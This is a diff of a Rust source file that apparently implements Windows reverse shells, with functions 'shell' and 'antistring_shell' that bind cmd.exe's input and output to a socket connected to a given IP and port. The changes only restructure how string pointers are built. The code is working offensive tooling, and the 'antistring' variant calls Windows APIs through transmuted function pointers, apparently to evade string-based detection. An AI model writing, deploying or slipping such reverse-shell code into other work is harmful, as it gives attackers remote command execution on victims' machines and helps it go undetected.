@@ -59,14 +59,17 @@ pub fn shell(ip: &str, port: u16) {
     };
     // This is magic that I don't really understand but seems to work
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
-    // Create a PSTR and use the IP string as the 0 field
-    let mut ip_pstr = PCSTR::null();
-    ip_pstr.0 = CString::new(ip).unwrap().into_raw() as *mut u8;
+    // Create a PCSTR and use the IP string as the 0 field
+    let ip_pcstr = PCSTR {
+        0: CString::new(ip)
+            .unwrap()
+            .into_raw() as *mut u8
+    };
     // Calling pton with the pointer sin_addr_ptr --> sockaddr_in.sin_addr should mean sockaddr_in.sin_addr has the IP struct now
     let conversion_result = unsafe {
         inet_pton(
             AF_INET.0 as i32,
-            ip_pstr,
+            ip_pcstr,
             sin_addr_ptr
         )
     };
@@ -121,8 +124,11 @@ pub fn shell(ip: &str, port: u16) {
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
-    let mut lp_command_line = PSTR::null();
-    lp_command_line.0 = CString::new(format!("{system_dir}\\cmd.exe")).unwrap().into_raw() as *mut u8;
+    let lp_command_line = PSTR {
+        0: CString::new(format!("{system_dir}\\cmd.exe"))
+            .unwrap()
+            .into_raw() as *mut u8
+    };
     let create_res = unsafe {
         CreateProcessA(
             PCSTR::null(),
@@ -164,11 +170,14 @@ pub fn antistring_shell(ip: &str, port: u16) {
     let mut sockaddr_in = SOCKADDR_IN::default();
     sockaddr_in.sin_family = AF_INET.0 as u16;
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
-    let mut ip_pstr = PCSTR::null();
-    ip_pstr.0 = CString::new(ip).unwrap().into_raw() as *mut u8;
+    let ip_pcstr = PCSTR {
+        0: CString::new(ip)
+            .unwrap()
+            .into_raw() as *mut u8
+    };
     unsafe { 
         mem::transmute::<*const (), fn(i32, PCSTR, *mut c_void) -> i32>
-        (function)(AF_INET.0 as i32, ip_pstr, sin_addr_ptr)
+        (function)(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr)
     };
 
     // See line 46
@@ -205,8 +214,11 @@ pub fn antistring_shell(ip: &str, port: u16) {
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
     let lp_application_name = PCSTR::null();
-    let mut lp_command_line = PSTR::null();
-    lp_command_line.0 = CString::new(format!("{system_dir}\\cmd.exe")).unwrap().into_raw() as *mut u8;
+    let lp_command_line = PSTR {
+        0: CString::new(format!("{system_dir}\\cmd.exe"))
+            .unwrap()
+            .into_raw() as *mut u8
+    };
     let lp_process_attributes = SECURITY_ATTRIBUTES::default();
     let lp_thread_attributes = SECURITY_ATTRIBUTES::default();
     let dw_creation_flags = PROCESS_CREATION_FLAGS::default();
